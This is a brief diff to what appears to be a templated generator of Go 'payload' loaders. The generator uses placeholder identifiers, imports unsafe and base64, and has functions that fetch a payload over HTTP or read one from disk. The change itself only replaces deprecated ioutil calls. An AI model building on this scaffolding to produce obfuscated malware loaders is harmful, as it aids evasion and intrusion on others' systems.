@@ -100,7 +100,7 @@ import (
 \t"encoding/base64"
 \t"flag"
 \t"fmt"
-\t"io/ioutil"
+\t"io"
 \t"net/http"
 \t"os"
 \t"unsafe"
@@ -141,13 +141,13 @@ func {v['fetchPayload']}(url string) []byte {{
 \t{v['resp']}, err := {v['httpClient']}.Get(url)
 \t{v['checkErr']}(err, "download failed")
 \tdefer {v['resp']}.Body.Close()
-\tdata, err := ioutil.ReadAll({v['resp']}.Body)
+\tdata, err := io.ReadAll({v['resp']}.Body)
 \t{v['checkErr']}(err, "read failed")
 \treturn data
 }}
 
 func {v['readPayload']}(p string) []byte {{
-\tdata, err := ioutil.ReadFile(p)
+\tdata, err := os.ReadFile(p)
 \t{v['checkErr']}(err, "load failed")
 \treturn data
 }}
